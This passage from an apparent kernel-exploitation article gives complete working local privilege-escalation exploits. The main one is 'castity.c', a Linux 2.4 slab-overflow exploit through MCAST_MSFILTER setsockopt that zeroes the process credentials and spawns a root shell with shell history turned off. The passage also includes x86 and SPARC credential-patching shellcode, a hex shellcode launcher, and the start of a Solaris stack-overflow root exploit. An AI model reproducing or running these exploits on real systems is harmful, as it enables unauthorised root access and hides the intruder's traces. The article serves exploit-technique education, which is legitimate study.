Since the copy_from_user at [3] happens _before_ the check at [4], we were
able to create a sequence of 1024-sized objects by repeatedly issuing a
failing (at [4]) 'setsockopt', thus obtaining a large-enough one. 

Hoping to make it clearer let's sum up the steps :        

  - fill the 1024 slabs so that at next allocation a fresh one is returned 
  - alloc the first object of the new 1024-slab.
  - use as many 'failing' setsockopt as needed to copy values inside
    objects 2 and 3 [and 4, if needed, not the usual case thou] 
  - free the first object 
  - use a smaller (but still 1024-slab allocation driving) value for
    optlen that would pass the check at [4] 

At that point the gsf pointer points to the first object inside our
freshly created slab. Objects 2 and 3 haven't been re-used yet, so still
contains our data. Since the objects inside the slab are adiacent we have
a de-facto larger (and large enough) gsf struct to reach the 'shm_file'
pointer. 

Last note, to reliably fill the slabs we check /proc/slabinfo. 
The exploit, called castity.c, was written when the advisory went out, and
is only for 2.4.* kernels (the sys_epoll vulnerability [12] was more than 
enough for 2.6.* ones ;) )

Exploit follows, just without the initial header, since the approach has
been already extensively explained above.
    
< stuff/expl/linux/castity.c >

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>

#define __u32           unsigned int
#define MCAST_MSFILTER  48
#define SOL_IP          0
#define SIZE            4096
#define R_FILE          "/etc/passwd"    // Set it to whatever file you
can read. It's just for 1024 filling.

struct in_addr {
   unsigned int   s_addr;
};

#define __SOCK_SIZE__   16

struct sockaddr_in {
  unsigned short        sin_family;     /* Address family               */
  unsigned short int    sin_port;       /* Port number                  */
  struct in_addr        sin_addr;       /* Internet address             */

  /* Pad to size of `struct sockaddr'. */
  unsigned char         __pad[__SOCK_SIZE__ - sizeof(short int) -
                        sizeof(unsigned short int) - sizeof(struct
in_addr)];
};

struct group_filter
{
        __u32                   gf_interface;   /* interface index */
        struct sockaddr_storage gf_group;       /* multicast address */
        __u32                   gf_fmode;       /* filter mode */
        __u32                   gf_numsrc;      /* number of sources */
        struct sockaddr_storage gf_slist[1];    /* interface index */
};

struct  damn_inode      {
        void            *a, *b;
        void            *c, *d;
        void            *e, *f;
        void            *i, *l;
        unsigned long   size[40];  // Yes, somewhere here :-)
} le;


struct  dentry_suck     {
        unsigned int    count, flags;
        void            *inode;
        void            *dd;
} fucking = { 0xbad, 0xbad, &le, NULL };

struct  fops_rox        {
        void            *a, *b, *c, *d, *e, *f, *g;
        void            *mmap;
        void            *h, *i, *l, *m, *n, *o, *p, *q, *r;
        void            *get_unmapped_area;
} chien;



struct  file_fuck       {
        void            *prev, *next;
        void            *dentry;
        void            *mnt;
        void            *fop;
} gagne = { NULL, NULL, &fucking, NULL, &chien };



static char     stack[16384];

int             gotsig = 0,
                fillup_1024 = 0,
                fillup_64 = 0,
                uid, gid;

int             *pid, *shmid;



static void sigusr(int b)
{
        gotsig = 1;
}

void fatal (char *str)
{
        fprintf(stderr, "[-] %s\n", str);
        exit(EXIT_FAILURE);
}

#define BUFSIZE 256

int calculate_slaboff(char *name)
{
        FILE *fp;
        char slab[BUFSIZE], line[BUFSIZE];
        int ret;
        /* UP case */
        int active_obj, total;

        bzero(slab, BUFSIZE);
        bzero(line, BUFSIZE);

        fp = fopen("/proc/slabinfo", "r");
        if ( fp == NULL )
                fatal("error opening /proc for slabinfo");

        fgets(slab, sizeof(slab) - 1, fp);
        do {
                ret = 0;
                if (!fgets(line, sizeof(line) - 1, fp))
                        break;
                ret = sscanf(line, "%s %u %u", slab, &active_obj, &total);
        } while (strcmp(slab, name));

        close(fileno(fp));
        fclose(fp);

        return ret == 3 ? total - active_obj : -1;

}

int populate_1024_slab()
{
        int fd[252];
        int i;

        signal(SIGUSR1, sigusr);

        for ( i = 0; i < 252 ; i++)
                fd[i] = open(R_FILE, O_RDONLY);

        while (!gotsig)
                pause();
        gotsig = 0;

        for ( i = 0; i < 252; i++)
                close(fd[i]);

}


int kernel_code()
{
        int i, c;
        int *v;

        __asm__("movl   %%esp, %0" : : "m" (c));

        c &= 0xffffe000;
         v = (void *) c;


        for (i = 0; i < 4096 / sizeof(*v) - 1; i++) {
                if (v[i] == uid && v[i+1] == uid) {
                        i++; v[i++] = 0; v[i++] = 0; v[i++] = 0;
                }
                if (v[i] == gid) {
                        v[i++] = 0; v[i++] = 0; v[i++] = 0; v[i++] = 0;
                        return -1;
                }
        }

        return -1;
}




void    prepare_evil_file ()
{
        int i = 0;

        chien.mmap = &kernel_code ;   // just to pass do_mmap_pgoff check
        chien.get_unmapped_area = &kernel_code;

        /*
         * First time i run the exploit i was using a precise offset for
         * size, and i calculated it _wrong_. Since then my lazyness took
	 * over and i use that ""very clean"" *g* approach.
         * Why i'm telling you ? It's 3 a.m., i don't find any better than
         * writing blubbish comments
         */

        for ( i = 0; i < 40; i++)
                le.size[i] = SIZE;

}

#define SEQ_MULTIPLIER  32768

void    prepare_evil_gf ( struct group_filter *gf, int id )
{
        int                     filling_space = 64 - 4 * sizeof(int);
        int                     i = 0;
        struct sockaddr_in      *sin;

        filling_space /= 4;

        for ( i = 0; i < filling_space; i++ )
        {
              sin = (struct sockaddr_in *)&gf->gf_slist[i];
              sin->sin_family = AF_INET;
              sin->sin_addr.s_addr = 0x41414141;
        }

        /* Emulation of struct kern_ipc_perm */

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = IPC_PRIVATE;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = uid;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = gid;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = uid;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = gid;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = -1;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = id/SEQ_MULTIPLIER;

        /* evil struct file address */

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = (unsigned long)&gagne;

        /* that will stop mcast loop */

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = 0xbad;
        sin->sin_addr.s_addr = 0xdeadbeef;

        return;

}

void    cleanup ()
{
        int                     i = 0;
        struct shmid_ds         s;

        for ( i = 0; i < fillup_1024; i++ )
        {
                kill(pid[i], SIGUSR1);
                waitpid(pid[i], NULL, __WCLONE);
        }

        for ( i = 0; i < fillup_64 - 2; i++ )
                shmctl(shmid[i], IPC_RMID, &s);

}


#define EVIL_GAP        4
#define SLAB_1024       "size-1024"
#define SLAB_64         "size-64"
#define OVF             21
#define CHUNKS          1024
#define LOOP_VAL        0x4000000f
#define CHIEN_VAL       0x4000000b

main()
{
        int                     sockfd, ret, i;
        unsigned int            true_alloc_size, last_alloc_chunk, loops;
        char                    *buffer;
        struct group_filter     *gf;
        struct shmid_ds         s;

        char    *argv[] = { "le-chien", NULL };
        char    *envp[] = { "TERM=linux", "PS1=le-chien\\$",
"BASH_HISTORY=/dev/null", "HISTORY=/dev/null", "history=/dev/null",
"PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin",
"HISTFILE=/dev/null", NULL };


        true_alloc_size = sizeof(struct group_filter) - sizeof(struct
sockaddr_storage) + sizeof(struct sockaddr_storage) * OVF;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);

        uid = getuid();
        gid = getgid();

        gf = malloc (true_alloc_size);
        if ( gf == NULL )
                fatal("Malloc failure\n");

        gf->gf_interface = 0;
        gf->gf_group.ss_family = AF_INET;

        fillup_64 = calculate_slaboff(SLAB_64);

        if ( fillup_64 == -1 )
                fatal("Error calculating slab fillup\n");

        printf("[+] Slab %s fillup is %d\n", SLAB_64, fillup_64);

        /* Yes, two would be enough, but we have that "sexy" #define, why
don't use it ? :-) */

        fillup_64 += EVIL_GAP;

        shmid = malloc(fillup_64 * sizeof(int));
        if ( shmid == NULL )
                fatal("Malloc failure\n");

        /* Filling up the size-64 and obtaining a new page with EVIL_GAP
entries */

        for ( i = 0; i < fillup_64; i++ )
                shmid[i] = shmget(IPC_PRIVATE, 4096, IPC_CREAT|SHM_R);

        prepare_evil_file();
        prepare_evil_gf(gf, shmid[fillup_64 - 1]);

        buffer = (char *)gf;

        fillup_1024 = calculate_slaboff(SLAB_1024);
        if ( fillup_1024 == -1 )
                fatal("Error calculating slab fillup\n");

        printf("[+] Slab %s fillup is %d\n", SLAB_1024, fillup_1024);

        fillup_1024 += EVIL_GAP;


        pid = malloc(fillup_1024 * sizeof(int));
        if (pid  == NULL )
                fatal("Malloc failure\n");

        for ( i = 0; i < fillup_1024; i++)
                pid[i] = clone(populate_1024_slab, stack + sizeof(stack) -
4, 0, NULL);

        printf("[+] Attempting to trash size-1024 slab\n");

        /* Here starts the loop trashing size-1024 slab */

        last_alloc_chunk = true_alloc_size % CHUNKS;
        loops = true_alloc_size / CHUNKS;

        gf->gf_numsrc = LOOP_VAL;

        printf("[+] Last size-1024 chunk is of size %d\n",
last_alloc_chunk);
        printf("[+] Looping for %d chunks\n", loops);

        kill(pid[--fillup_1024], SIGUSR1);
        waitpid(pid[fillup_1024], NULL, __WCLONE);

        if ( last_alloc_chunk > 512  )
                ret = setsockopt(sockfd, SOL_IP, MCAST_MSFILTER, buffer +
loops * CHUNKS, last_alloc_chunk);
        else

        /*
         * Should never happen. If it happens it probably means that we've
         * bigger datatypes (or slab-size), so probably
         * there's something more to "fix me". The while loop below is
         * already okay for the eventual fixing ;)
         */
  
              fatal("Last alloc chunk fix me\n");

        while ( loops > 1 )
        {
                kill(pid[--fillup_1024], SIGUSR1);
                waitpid(pid[fillup_1024], NULL, __WCLONE);

                ret = setsockopt(sockfd, SOL_IP, MCAST_MSFILTER, buffer +
--loops * CHUNKS, CHUNKS);
        }

        /* Let's the real fun begin */

        gf->gf_numsrc = CHIEN_VAL;

        kill(pid[--fillup_1024], SIGUSR1);
        waitpid(pid[fillup_1024], NULL, __WCLONE);

        shmctl(shmid[fillup_64 - 2], IPC_RMID, &s);
        setsockopt(sockfd, SOL_IP, MCAST_MSFILTER, buffer, CHUNKS);

        cleanup();

        ret = (unsigned long)shmat(shmid[fillup_64 - 1], NULL,
SHM_RDONLY);


        if ( ret == -1)
        {
                printf("Le Fucking Chien GAGNE!!!!!!!\n");
                setresuid(0, 0, 0);
                setresgid(0, 0, 0);
                execve("/bin/sh", argv, envp);
                exit(0);
        }

        printf("Here we are, something sucked :/ (if not L1_cache too big,
probably slab align, retry)\n" );

}
   
< / > 


------[ 2.3 - Stack overflow vulnerabilities


When a process is in 'kernel mode' it has a stack which is different from
the stack it uses at userland. We'll call it 'kernel stack'. 
That kernel stack is usually limited in size to a couple of pages (on
Linux, for example, it is 2 pages, 8kb, but an option at compile time 
exist to have it limited at one page) and is not a surprise that a common
design practice in kernel code developing is to use locally to a function
as little stack space as possible.

At a first glance, we can imagine two different scenarios that could go
under the name of 'stack overflow vulnerabilities' :

 - 'standard' stack overflow vulnerability : a write past a buffer on the
   stack overwrites the saved instruction pointer or the frame pointer
   (Solaris only, Linux is compiled with -fomit-frame-pointer) or some
   variable (usually a pointer) also located in the stack. 

 - 'stack size overflow' : a deeply nested callgraph goes further the
   alloc'ed stack space.  

Stack based explotation is more architectural and o.s. specific than the
already presented slab based one.
That is due to the fact that once the stack is trashed we achieve
execution flow hijack, but then we must find a way to somehow return to
userland. We con't cover here the details of x86 architecture, since those
have been already very well explained by noir in his phrack60 paper [13]. 

We will instead focus on the UltraSPARC architecture and on its more
common operating system, Solaris. The next subsection will describe the
relevant details of it and will present a technique which is suitable
aswell for the exploiting of slab based overflow (or, more generally,
whatever 'controlled flow redirection' vulnerability). 

The AMD64 architecture won't be covered yet, since it will be our 'example
architecture' for the next kind of vulnerabilities (race condition). The
sendmsg [5] exploit proposed later on is, at the end, a stack based one.

Just before going on with the UltraSPARC section we'll just spend a couple
of words describing the return-to-ring3 needs on an x86 architecture and
the Linux use of the kernel stack (since it quite differs from the Solaris
one). 

Linux packs together the stack and the struct associated to every process
in the system (on Linux 2.4 it was directly the task_struct, on Linux 2.6
it is the thread_info one, which is way smaller and keeps inside a pointer
to the task_struct). This memory area is, by default, 8 Kb (a kernel
option exist to have it limited to 4 Kb), that is the size of two pages,
which are allocated consecutively and with the first one aligned to a 2^13
multiple. The address of the thread_struct (or of the task_struct) is thus
calculable at runtime by masking out the 13 least significant bits of the
Kernel Stack (%esp).  

The stack starts at the bottom of this page and 'grows' towards the top,
where the thread_info (or the task_struct) is located. To prevent the
'second' type of overflow when the 4 Kb Kernel Stack is selected at
compile time, the kernel uses two adjunctive per-CPU stacks, one for
interrupt handling and one for softirq and tasklets functions, both one
page sized. 

It is obviously on the stack that Linux stores all the information to
return from exceptions, interrupts or function calls and, logically, to 
get back to ring3, for example by means of the iret instruction. 
If we want to use the 'iret' instruction inside our shellcodes to get out
cleanly from kernel land we have to prepare a fake stack frame as it
expects to find.

We have to supply:
  - a valid user space stack pointer
  - a valid user space instruction pointer
  - a valid EFLAGS saved EFLAGS register
  - a valid User Code Segment
  - a valid User Stack Segment

 LOWER ADDRESS
 +-----------------+
 |                 |
 |   User SS       | -+
 |   User ESP      |  |
 |   EFLAGS        |  |  Fake Iret Frame
 |   User CS       |  |
 |   User EIP      | -+  <----- current kernel stack pointer (ESP)
 |                 |
 +-----------------+
 
We've added a demonstrative stack based exploit (for the Linux dummy 
driver) which implements a shellcode doing that recovery-approach :

  movl   $0x7b,0x10(%esp)       // user stack segment (SS)
  movl   $stack_chunk,0xc(%esp) // user stack pointer (ESP)
  movl   $0x246,0x8(%esp)       // valid EFLAGS saved register
  movl   $0x73,0x4(%esp)        // user code segment (CS)
  movl   $code_chunk,0x0(%esp)  // user code pointer  (EIP)
  iret

You can find it in < expl/linux/stack_based.c > 


---[ 2.3.1 - UltraSPARC exploiting


The UltraSPARC [14] is a full implementation of the SPARC V9 64-bit [2] 
architecture. The most 'interesting' part of it from an exploiting
perspective is the support it gives to the operating system for a fully
separated address space among userspace and kernelspace.

This is achieved through the use of context registers and address space
identifiers 'ASI'. The UltraSPARC MMU provides two settable context
registers, the primary (PContext) and the secondary (SContext) one. One
more context register hardwired to zero is provided, which is the nucleus
context ('context' 0 is where the kernel lives).
To every process address space is associated a 'context value', which is
set inside the PContext register during process execution. This value is
used to perform memory addresses translation. 

Every time a process issues a trap instruction to access kernel land (for
example ta 0x8 or ta 0x40, which is how system call are implemented on
Solaris 10), the nucleus context is set as default. The process context
value (as recorded inside PContext) is then moved to SContext, while the
nucleus context becomes the 'primary context'. 

At that point the kernel code can access directly the userland by
specifying the correct ASI to a load or store alternate instruction
(instructions that support a direct asi immediate specified - lda/sta). 
Address Space Identifiers (ASIs) basically specify how those instruction
have to behave :

< usr/src/uts/sparc/v9/sys/asi.h >

#define ASI_N                   0x04    /* nucleus */
#define ASI_NL                  0x0C    /* nucleus little */
#define ASI_AIUP                0x10    /* as if user primary */
#define ASI_AIUS                0x11    /* as if user secondary */
#define ASI_AIUPL               0x18    /* as if user primary little */
#define ASI_AIUSL               0x19    /* as if user secondary little */

[...]

#define ASI_USER        ASI_AIUS

< / > 

Theese are ASI that are specified by the SPARC v9 reference (more ASI are
machine dependant and let modify, for example, MMU or other hardware
registers, check usr/src/uts/sun4u/sys/machasi.h), the 'little' version is
just used to specify a byte ordering access different from the 'standard'
big endian one (SPARC v9 can access data in both formats).

The ASI_USER is the one used to access, from kernel land, the user space. 
An instruction like :

       ldxa [addr]ASI_USER, %l1 

would just load the double word stored at 'addr', relative to the address
space contex stored in the SContext register, 'as if' it was accessed by
userland code (so with all protection checks). 

It is thus possible, if able to start executing a minimal stub of code, to
copy bytes from the userland wherever we want at kernel land.  

But how do we execute code at first ? Or, to make it even more clearer,
where do we return once we have performed our (slab/stack) overflow and
hijacked the instruction pointer ? 

To complicate things a little more, the UltraSPARC architecture implements
the execution bit permission over TTEs (Translation Table Entry, which are
the TLB entries used to perform virtual/physical translations). 

It is time to give a look at Solaris Kernel implementation to find a
solution. The technique we're going to present now (as you'll quickly
figure out) is not limited to stack based exploiting, but can be used
every time you're able to redirect to an arbitrary address the instruction 
flow at kernel land.


---] 2.3.2 - A reliable Solaris/UltraSPARC exploit


The Solaris process model is slightly different from the Linux one. The
foundamental unit of scheduling is the 'kernel thread' (described by the
kthread_t structure), so one has to be associated to every existing LWP 
(light-weight process) in a process.
LWPs are just kernel objects which represent the 'kernel state' of every
'user thread' inside a process and thus let each one enter the kernel
indipendently (without LWPs, user thread would contend at system call).

The information relative to a 'running process' are so scattered among
different structures. Let's see what we can make out of them. 
Every Operating System (and Solaris doesn't differ) has a way to quickly
get the 'current running process'. On Solaris it is the 'current kernel
thread' and it's obtained, on UltraSPARC, by :

#define curthread       (threadp())  

< usr/src/uts/sparc/ml/sparc.il >

! return current thread pointer

        .inline threadp,0
        .register %g7, #scratch
        mov     %g7, %o0
        .end

< / > 

It is thus stored inside the %g7 global register. 
From the kthread_t struct we can access all the other 'process related'
structs. Since our main purpose is to raise privileges we're interested in
where the Solaris kernel stores process credentials. 

Those are saved inside the cred_t structure pointed to by the proc_t one :

# mdb -k
Loading modules: [ unix krtld genunix ip usba nfs random ptm ]
> ::ps ! grep snmpdx
R    278      1    278    278     0 0x00010008 0000030000e67488 snmpdx
> 0000030000e67488::print proc_t
{
    p_exec = 0x30000e5b5a8
    p_as = 0x300008bae48
    p_lockp = 0x300006167c0
    p_crlock = {
        _opaque = [ 0 ]
    }
    p_cred = 0x3000026df28
[...]
> 0x3000026df28::print cred_t
{
    cr_ref = 0x67b
    cr_uid = 0
    cr_gid = 0
    cr_ruid = 0
    cr_rgid = 0
    cr_suid = 0
    cr_sgid = 0
    cr_ngroups = 0
    cr_groups = [ 0 ]
}
> ::offsetof proc_t p_cred
offsetof (proc_t, p_cred) = 0x20
> ::quit

#

The '::ps' dcmd ouput introduces a very interesting feature of the Solaris
Operating System, which is a god-send for exploiting.
The address of the proc_t structure in kernel land is exported to
userland : 

bash-2.05$ ps -aef -o addr,comm | grep snmpdx
     30000e67488 /usr/lib/snmp/snmpdx
bash-2.05$

At a first glance that could seem of not great help, since, as we said, 
the kthread_t struct keeps a pointer to the related proc_t one :

> ::offsetof kthread_t t_procp
offsetof (kthread_t, t_procp) = 0x118
> ::ps ! grep snmpdx
R    278      1    278    278     0 0x00010008 0000030000e67488 snmpdx
> 0000030000e67488::print proc_t p_tlist
p_tlist = 0x30000e52800
> 0x30000e52800::print kthread_t t_procp
t_procp = 0x30000e67488
>

To understand more precisely why the exported address is so important we
have to take a deeper look at the proc_t structure. 
This structure contains the user_t struct, which keeps information like
the program name, its argc/argv value, etc : 

> 0000030000e67488::print proc_t p_user
[...]
    p_user.u_ticks = 0x95c
    p_user.u_comm = [ "snmpdx" ]
    p_user.u_psargs = [ "/usr/lib/snmp/snmpdx -y -c /etc/snmp/conf" ]
    p_user.u_argc = 0x4
    p_user.u_argv = 0xffbffcfc
    p_user.u_envp = 0xffbffd10
    p_user.u_cdir = 0x3000063fd40
[...]

We can control many of those. 
Even more important, the pages that contains the process_cache (and thus
the user_t struct), are not marked no-exec, so we can execute from there
(for example the kernel stack, allocated from the seg_kp [kernel pageable
memory] segment, is not executable). 

Let's see how 'u_psargs' is declared :

< usr/src/common/sys/user.h >
#define PSARGSZ         80      /* Space for exec arguments (used by
ps(1)) */
#define MAXCOMLEN       16      /* <= MAXNAMLEN, >= sizeof (ac_comm) */

[...]

typedef struct  user {
        /*
         * These fields are initialized at process creation time and never
         * modified.  They can be accessed without acquiring locks.
         */
        struct execsw *u_execsw;        /* pointer to exec switch entry */
        auxv_t  u_auxv[__KERN_NAUXV_IMPL]; /* aux vector from exec */
        timestruc_t u_start;            /* hrestime at process start */
        clock_t u_ticks;                /* lbolt at process start */
        char    u_comm[MAXCOMLEN + 1];  /* executable file name from exec
*/
        char    u_psargs[PSARGSZ];      /* arguments from exec */
        int     u_argc;                 /* value of argc passed to main()
*/
        uintptr_t u_argv;               /* value of argv passed to main()
*/
        uintptr_t u_envp;               /* value of envp passed to main()
*/
  
[...]

< / >

The idea is simple : we put our shellcode on the command line of our
exploit (without 'zeros') and we calculate from the exported proc_t
address the exact return address.
This is enough to exploit all those situations where we have control of
the execution flow _without_ trashing the stack (function pointer
overwriting, slab overflow, etc). 

We have to remember to take care of the alignment, thou, since the
UltraSPARC fetch unit raises an exception if the address it reads the
instruction from is not aligned on a 4 bytes boundary (which is the size
of every sparc instruction) :

> ::offsetof proc_t p_user
offsetof (proc_t, p_user) = 0x330
> ::offsetof user_t u_psargs
offsetof (user_t, u_psargs) = 0x161
>

Since the proc_t taken from the 'process cache' is always aligned to an 8
byte boundary, we have to jump 3 bytes after the starting of the u_psargs
char array (which is where we'll put our shellcode).  
That means that we have space for 76 / 4 = 19 instructions, which is
usually enough for average shellcodes.. but space is not really a limit
since we can 'chain' more psargs struct from different processes, simply
jumping from each others. Moreover we could write a two stage shellcode
that would just start copying over our larger one from the userland using
the load from alternate space instructions presented before. 

We're now facing a slightly more complex scenario, thou, which is the
'kernel stack overflow'. We assume here that you're somehow familiar with
userland stack based exploiting (if you're not you can check [15] and
[16]). 
The main problem here is that we have to find a way to safely return to
userland once trashed the stack (and so, to reach the instruction pointer,
the frame pointer). A good way to understand how the 'kernel stack' is
used to return to userland is to follow the path of a system call. 
You can get a quite good primer here [17], but we think that a read
through opensolaris sources is way better (you'll see also, following the
sys_trap entry in uts/sun4u/ml/mach_locore.s, the code setting the nucleus
context as the PContext register). 

Let's focus on the 'kernel stack' usage : 

< usr/src/uts/sun4u/ml/mach_locore.s >

        ALTENTRY(user_trap)
        !
        ! user trap
        !
        ! make all windows clean for kernel
        ! buy a window using the current thread's stack
        !
        sethi   %hi(nwin_minus_one), %g5
        ld      [%g5 + %lo(nwin_minus_one)], %g5
        wrpr    %g0, %g5, %cleanwin
        CPU_ADDR(%g5, %g6)
        ldn     [%g5 + CPU_THREAD], %g5
        ldn     [%g5 + T_STACK], %g6
        sub     %g6, STACK_BIAS, %g6
        save    %g6, 0, %sp
  
< / > 

In %g5 is saved the number of windows that are 'implemented' in the
architecture minus one, which is, in that case, 8 - 1 = 7.
CLEANWIN is set to that value since there are no windows in use out of the
current one, and so the kernel has 7 free windows to use. 

The cpu_t struct addr is then saved in %g5 (by CPU_ADDR) and, from there,
the thread pointer [ cpu_t->cpu_thread ] is obtained. 
From the kthread_t struct is obtained the 'kernel stack address' [the
member name is called t_stk]. This one is a good news, since that member
is easy accessible from within a shellcode (it's just a matter of
correctly accessing the %g7 / thread pointer). From now on we can follow
the sys_trap path and we'll be able to figure out what we will find on the
stack just after the kthread_t->t_stk value and where. 

To that value is then subtracted 'STACK_BIAS' : the 64-bit v9 SPARC ABI
specifies that the %fp and %sp register are offset by a constant, the
stack bias, which is 2047 bits. This is one thing that we've to remember
while writing our 'stack fixup' shellcode. 
On 32-bit running kernels the value of this constant is 0. 

The save below is another good news, because that means that we can use
the t_stk value as a %fp (along with the 'right return address') to return
at 'some valid point' inside the syscall path (and thus let it flow from
there and cleanily get back to userspace). 

The question now is : at which point ? Do we have to 'hardcode' that
return address or we can somehow gather it ? 

A further look at the syscall path reveals that :

        ENTRY_NP(utl0)
        SAVE_GLOBALS(%l7)
        SAVE_OUTS(%l7)
        mov     %l6, THREAD_REG
        wrpr    %g0, PSTATE_KERN, %pstate       ! enable ints
        jmpl    %l3, %o7                        ! call trap handler
        mov     %l7, %o0

And, that %l3 is : 

have_win:
        SYSTRAP_TRACE(%o1, %o2, %o3)


        !
        ! at this point we have a new window we can play in,
        ! and %g6 is the label we want done to bounce to
        !
        ! save needed current globals
        !
        mov     %g1, %l3        ! pc
        mov     %g2, %o1        ! arg #1
        mov     %g3, %o2        ! arg #2
        srlx    %g3, 32, %o3    ! pseudo arg #3
        srlx    %g2, 32, %o4    ! pseudo arg #4
 
%g1 was preserved since : 

#define SYSCALL(which)                  \
        TT_TRACE(trace_gen)             ;\
        set     (which), %g1            ;\
        ba,pt   %xcc, sys_trap          ;\
        sub     %g0, 1, %g4             ;\
        .align  32

and so it is syscall_trap for LP64 syscall and syscall_trap32 for ILP32
syscall. Let's check if the stack layout is the one we expect to find :

> ::ps ! grep snmp
R    291      1    291    291     0 0x00020008 0000030000db4060 snmpXdmid
R    278      1    278    278     0 0x00010008 0000030000d2f488 snmpdx
> ::ps ! grep snmpdx
R    278      1    278    278     0 0x00010008 0000030000d2f488 snmpdx
> 0000030000d2f488::print proc_t p_tlist
p_tlist = 0x30001dd4800
> 0x30001dd4800::print kthread_t t_stk
t_stk = 0x2a100497af0 ""
> 0x2a100497af0,16/K
0x2a100497af0:  1007374         2a100497ba0     30001dd2048     1038a3c
                1449e10         0               30001dd4800
                2a100497ba0     ffbff700        3               3a980
                0               3a980           0
                ffbff6a0        ff1525f0        0               0
                0               0               0
                0
> syscall_trap32=X
                1038a3c
>
  
Analyzing the 'stack frame' we see that the saved %l6 is exactly
THREAD_REG (the thread value, 30001dd4800) and %l3 is 1038a3c, the
syscall_trap32 address. 

At that point we're ready to write our 'shellcode' : 

# cat sparc_stack_fixup64.s

.globl begin
.globl end

begin:
        ldx [%g7+0x118], %l0
        ldx [%l0+0x20], %l1
        st %g0, [%l1 + 4]
        ldx [%g7+8], %fp
        ldx [%fp+0x18], %i7
        sub %fp,2047,%fp
        add 0xa8, %i7, %i7

        ret
        restore
end:
#

At that point it should be quite readable : it gets the t_procp address
from the kthread_t struct and from there it gets the p_cred addr.
It then sets to zero (the %g0 register is hardwired to zero) the cr_uid
member of the cred_t struct and uses the kthread_t->t_stk value to set
%fp. %fp is then dereferenced to get the 'syscall_trap32' address and the
STACK_BIAS subtraction is then performed. 

The add 0xa8 is the only hardcoded value, and it's the 'return place'
inside syscall_trap32. You can quickly derive it from a ::findstack dcmd
with mdb. A more advanced shellcode could avoid this 'hardcoded value' by
opcode scanning from the start of the syscall_trap32 function and looking
for the jmpl %reg,%o7/nop sequence (syscall_trap32 doesn't get a new
window, and stays in the one sys_trap had created) pattern. 
On all the boxes we tested it was always 0xa8, that's why we just left it
hardcoded. 

As we said, we need the shellcode to be into the command line, 'shifted' 
of 3 bytes to obtain the correct alignment. To achieve that a simple
launcher code was used :

bash-2.05$ cat launcer_stack.c
#include <unistd.h>

char sc[] = "\x66\x66\x66"              // padding for alignment
"\xe0\x59\xe1\x18\xe2\x5c\x20\x20\xc0\x24\x60\x04\xfc\x59\xe0"
"\x08\xfe\x5f\xa0\x18\xbc\x27\xa7\xff\xbe\x07\xe0\xa8\x81"
"\xc7\xe0\x08\x81\xe8\x00\x00";

int main()
{
        execl("e", sc, NULL);
        return 0;
}
bash-2.05$

The shellcode is the one presented before. 

Before showing the exploit code, let's just paste the vulnerable code,
from the dummy driver provided for Solaris :

< stuff/drivers/solaris/test.c >

[...]

static int handle_stack (intptr_t arg)
{
        char buf[32];
        struct test_comunique t_c;

        ddi_copyin((void *)arg, &t_c, sizeof(struct test_comunique), 0);

        cmn_err(CE_CONT, "Requested to copy over buf %d bytes from %p\n",
t_c.size, &buf);

        ddi_copyin((void *)t_c.addr, buf, t_c.size, 0); [1]

        return 0;
}

static int test_ioctl (dev_t dev, int cmd, intptr_t arg, int mode,
                        cred_t *cred_p, int *rval_p )
{
    cmn_err(CE_CONT, "ioctl called : cred %d %d\n", cred_p->cr_uid,
cred_p->cr_gid);

    switch ( cmd )
    {
        case TEST_STACKOVF: {
        	handle_stack(arg);
	}

[...]

< / > 

The vulnerability is quite self explanatory and is a lack of 'input
sanitizing' before calling the ddi_copyin at [1]. 

Exploit follows :

< stuff/expl/solaris/e_stack.c >

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "test.h"

#define BUFSIZ 192

char buf[192];

typedef struct psinfo {
        int     pr_flag;        /* process flags */
        int     pr_nlwp;        /* number of lwps in process */
        pid_t   pr_pid;         /* unique process id */
        pid_t   pr_ppid;        /* process id of parent */
        pid_t   pr_pgid;        /* pid of process group leader */
        pid_t   pr_sid;         /* session id */
        uid_t   pr_uid;         /* real user id */
        uid_t   pr_euid;        /* effective user id */
        gid_t   pr_gid;         /* real group id */
        gid_t   pr_egid;        /* effective group id */
        uintptr_t pr_addr;      /* address of process */
        size_t  pr_size;        /* size of process image in Kbytes */
} psinfo_t;

#define ALIGNPAD        3

#define PSINFO_PATH     "/proc/self/psinfo"

unsigned long getaddr()
{
        psinfo_t        info;
        int             fd;

        fd = open(PSINFO_PATH, O_RDONLY);
        if ( fd == -1)
        {
                perror("open");
                return -1;
        }

        read(fd, (char *)&info, sizeof (info));
        close(fd);
        return info.pr_addr;
}
 

#define UPSARGS_OFFSET 0x330 + 0x161

int exploit_me()
{
        char    *argv[] = { "princess", NULL };
        char    *envp[] = { "TERM=vt100", "BASH_HISTORY=/dev/null",
"HISTORY=/dev/null", "history=/dev/null",
     "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin",
"HISTFILE=/dev/null", NULL };

         printf("Pleased to see you, my Princess\n");
         setreuid(0, 0);
         setregid(0, 0);
         execve("/bin/sh", argv, envp);
         exit(0);

}

#define SAFE_FP     0x0000000001800040 + 1
